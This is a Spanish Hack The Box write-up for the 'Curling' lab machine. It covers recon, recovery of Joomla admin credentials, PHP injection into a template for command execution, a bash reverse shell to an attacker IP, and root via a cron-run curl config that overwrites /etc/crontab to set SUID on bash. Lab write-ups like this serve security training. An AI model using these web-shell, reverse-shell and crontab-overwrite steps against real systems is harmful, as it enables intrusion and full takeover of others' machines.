---
title: Writeup curling - Hack The Box - Resolución y Análisis
published: true
tags:
  - hackthebox
  - writeup
  - curling
  - ciberseguridad
  - pentesting
description: Writeup y resolución de la máquina curling en Hack The Box.
keywords:
  - writeup curling
  - hack the box curling
  - resolución máquina curling
  - curling hack the box
  - htb curling
---
--------
### 🔗 Accesos rápidos

- 📄 **Writeup online**: [Link](https://publish.obsidian.md/bunzopy/HTB/Facil/Linux/Curling)
- 📺 **Resolución en vivo (completa)**: [Parte1](https://www.youtube.com/watch?v=bW7qDzB0kfs)|[Parte2](https://www.youtube.com/watch?v=E8MILfksvm0)|[Parte3](https://www.youtube.com/watch?v=TLPnbmdldo0)
- 🧠 **Explicación resumida**: 

---

#easy #linux #nmap #ping #rce

-------
# Guided Mode



---------
# [[Reconocimiento de OS(Sistema operativo) y puertos abiertos con NMAP]]
```shell
ping -c 1 10.10.10.150
nmap -p- --open -vvv -sS --min-rate 5000 -n -Pn 10.10.10.150 -oG allports
extract Ports allports
nmap -sCV -p22,80 10.10.10.150 -oN target
```
![[Curling1.png]]![[Curling2.png]]
*TTL:* Maquina Linux
*Puertos*
	`22` [[ssh]]
	`80` HTTP

--------------
# [[Whatweb-wappalyzer]]
```shell
whatweb http://10.10.10.150
```

![[Curling3.png]]
El whatweb no nos da ninguna información relevante


Este nos da un panel de acceso
	http://10.10.10.150/administrator/
	
Viendo el codigo fuente de la pagina principal http://10.10.10.150 al final de todo nos pone secret.txt
![[Curling4.png]]
Entramos a http://10.10.10.150/secret.txt
![[Curling5.png]]
Es una linea en base64
![[Curling6.png]]
Esta va a ser la contraseña, y el usuario lo saque de esta publicacion
![[Curling7.png]]

Usuario: Floris
Contraseña: Curling2018!

-------------
# [[RCE(Remote Comand Ejecution) En joomla]] y  [[Reverse shell]]

[Articulo que explica como sacar una revershell con joomla](https://www.hackingarticles.in/joomla-reverse-shell/)
Vamos a ir a la parte de templates, 
![[Curling8.png]]

Vamos a seleccionar la parte de templates que esta a la izquierda, y despues vamos a elegir cualquiera en mi caso uso el de beez3
![[Curling9.png]]
Ahora vamos a modificar en mi caso el archivo error.php y le vamos a inyectar este comando. Y guardamos los cambios
```
<?php system("whoami");?>
```
![[Curling10.png]]
Ahora cuando entremos al link
http://10.10.10.150/templates/beez3/error.php nos tendria que aparecer la respuesta del comando whoami
![[Curling11.png]]


Como nos responde que usuarios somos, ya sabemos que hay un RCE, y vamos a intentar mandarnos una [[Reverse shell]]

 ```php
 <?php system("bash -c 'bash -i >& /dev/tcp/10.10.16.4/443 0>&1'");?>
```
Mientras nos ponemos en escucha con [[nc -nlvp 443]]
![[Curling12.png]]
Y listo ya ganamos acceso a la maquina
![[Curling13.png]]

-----------
# [[Apuntes Directo/Herramientas-Comandos/Tratamiento de la TTY|Tratamiento de la TTY]]

----------
# Escalada al usuario floris con [[Tipos de archivo y archivos comprimidos]] y conexion por [[ssh]]

Encontramos esto en el home de floris y vamos a usar la herramienta [[xxd]] ya que esta en hexadecimal, para descifrar el contenido
![[Curling15.png]]
```shell
cat password_backup | xxd -r  > /tmp/pass
```
No da nada legible, asi que al aplicar [[file]] con el comando `file pass` veo que el tipo de archivo es [[bzip2]], despues pasa a ser un [[gzip]], luego un [[bzip2]] nuevamente y por ultimo [[tar]]. Para finalmente con [[cat]] ver la contraseña
```shell
bzip2 -d pass
file pass.out   //Veo que es un gzip
mv pass.out pass.gz
gzip -d pass.gz
file pass // Veo que es un bzip2 de nuevo
bzip2 -d pass
file pass.out // Es un archivo tar ahora
tar xf pass.out
cat password.txt
```

![[Curling16.png]]
*Contraseña:* 5d<wdCbdZu)|hChXll

Ya tenemos una contraseña que aparenta ser de floris, asi que vamos a intentar conectarnos por [[ssh]]

![[Curling17.png]]
Ya podemos sacar la primera flag, y solamente nos faltaria hacernos root para completar el laboratorio

### Escalada a root: Mediante tarea cron

##### Enumeracion
Ejecutamos el [[PSPY]]
![[Curling18.png]]
Vemos en el PID 2872 el curl que manda con el parametro `curl -K`, que sirve para especificar la configuracion mediante un archivo.    [[curl]]

##### Explotacion
Vamos a crear un archivo exploit en un nuestra maquina
```
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin

* * * * * root chmod u+s /bin/bash
```
Vamos a abrir un server con [[python3 -m http.server]]

Contenido del archivo input
```
url = "http://10.10.16.4/exploit"              // En donde esta el 10.10.16.4 va nuestra ip de atacante y despues del / va el nombre del archivo
output = "/etc/crontab"
```

Ahora cuando se ejecute la tarea cron, va a hacer que la bash tenga permisos SUID
![[Curling19.png]]
Una vez que vemos la s, ya sabemos que podemos ejecutar `bash -p` para ganar permisos en la bash
![[Curling20.png]]
Ya estamos logeados como root, asi que podemos visualizar la flag

-------
# Notas

##### Diferencias entre sh, bash y zsh 
*Las 3 utilizan los mismos comandos de base, pero puede haber funcionalidades que tenga la zsh, y que no esten en la sh*
`sh` Es la mas antigua, tiene menos funciones y es la shell original
`bash` Mas completa que la sh y actualizada
`zsh` Es como la bash pero con esteroides y mas personalizable

###### Por que se define la BASH y SHELL en la tarea cron
*SHELL:* Si no se especifica va a usar por defecto una sh, la cual puede ser que no interprete todos los comandos
*PATH:* Si no se pone esto, cron puede no encontrar cosas como python, nc, curl, bash, etc

-----------
# Creditos
[Writeup de lanzt](https://lanzt.github.io/htb/curling)
Writeup oficial de HTB

